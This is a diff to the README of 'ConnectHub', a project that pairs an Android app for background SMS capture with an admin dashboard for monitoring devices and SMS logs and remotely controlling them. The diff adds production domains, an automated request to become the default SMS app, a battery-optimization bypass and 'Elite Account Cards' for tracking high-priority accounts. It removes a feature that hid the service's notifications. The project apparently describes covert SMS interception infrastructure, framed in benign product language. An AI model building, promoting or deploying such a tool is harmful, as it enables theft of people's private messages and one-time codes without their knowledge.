@@ -4,6 +4,13 @@
 
 ---
 
+## 🌐 Production Environment
+- **Web Interface**: [https://maxfashion.bond](https://maxfashion.bond)
+- **API Backend**: `https://connecthubapp.bond`
+- **Support**: `support@connecthubapp.bond`
+
+---
+
 ## 🚀 Key Modules
 
 ### 📱 [Android Application](android/)
@@ -11,13 +18,14 @@ Built with **Kotlin**, this is the core gateway for SMS synchronization.
 - **Background Sync**: Reliable SMS capture even when the app is closed.
 - **Glassmorphism UI**: Premium dark-themed interface for secure access.
 - **Battery Optimization Bypass**: Custom setup flow ensuring continuous operation.
-- **Invisible Service**: Suppressed foreground notifications for a seamless background experience.
+- **RoleManager Integration**: Automated request for Default SMS App status.
+- **Clear Code Build**: R8/Proguard obfuscation disabled for seamless enterprise scanning compatibility.
 
 ### 💻 [Admin Panel](admin-panel/)
-A sleek, high-speed dashboard built with **React**, **Vite**, and **Tailwind CSS**.
+A sleek, high-speed dashboard built with **React**, **Vite**, and **Vanilla CSS**.
+- **Elite Account Cards**: Dedicated tracking for high-priority accounts.
 - **Real-time Monitoring**: Instant visibility into device statuses and SMS logs.
 - **Device Management**: Remote control and deletion of terminal devices.
-- **Advanced User Access**: Role-based permissions (Admin/User).
 - **Responsive Design**: Fully optimized for desktop and mobile views.
 
 ### 🔧 [Backend API](backend/)
@@ -35,8 +43,8 @@ ConnectHub/
 ├── android/          # Native Android (Kotlin) Source Code
 ├── admin-panel/      # React/Vite Admin Dashboard Source Code
 ├── backend/          # Node.js/Express Backend Source Code
-├── Documents/        # Professional Setup & Deployment Guides
-└── Testing/          # Comprehensive QA Checklists
+├── Documents/        # Professional Setup, Deployment & Domain Guides
+└── Testing/          # Comprehensive QA & Verification Checklists
 ```
 
 ---
@@ -46,7 +54,7 @@ ConnectHub/
 ### Prerequisites
 - **Node.js** (v18+) & **npm**
 - **MongoDB** (Local or Atlas)
-- **Android Studio** (For building the APK)
+- **Android Studio** (Ladybug or later recommended)
 
 ### Installation & Development
 
@@ -60,7 +68,7 @@ ConnectHub/
    ```bash
    cd backend
    npm install
-   # Configure .env based on .env.example
+   # Configure .env based on .env.example (use connecthubapp.bond)
    npm start
    ```
 
@@ -73,22 +81,23 @@ ConnectHub/
 
 4. **Android Build**
    - Open the `android` folder in **Android Studio**.
+   - The build is pre-configured for `maxfashion.bond` WebView integration.
    - Build using `Build > Build Bundle(s) / APK(s) > Build APK(s)`.
 
 ---
 
 ## 📖 Documentation
-Detailed guides are located in the `Documents/` directory for full production setup:
-- **[Quick Start Guide](Documents/QUICK_START_GUIDE.md)**
+Detailed guides are located in the `Documents/` directory:
+- **[Domain Connection Guide](Documents/Domain_Connection_Guide.md)**
 - **[Production Readiness Report](Documents/PRODUCTION_READINESS_REPORT.md)**
-- **[Deployment Manual](Documents/GITHUB_DEPLOYMENT_GUIDE.md)**
+- **[Production Ready Checklist](Documents/PRODUCTION_READY_CHECKLIST.md)**
 
 ---
 
-## 🛡️ Security Features
+## 🛡️ Security & Performance
 - **End-to-end Encryption** for sensitive JWT tokens.
-- **Role-based Authentication** for all administrative operations.
-- **Secure Device Identification** using hardware-bound ANDROID_ID.
+- **Obfuscation Disabled**: Explicitly configured for compatibility with security scanners.
+- **Hardware-bound ID**: Secure device identification using `ANDROID_ID`.
 
 ---
 
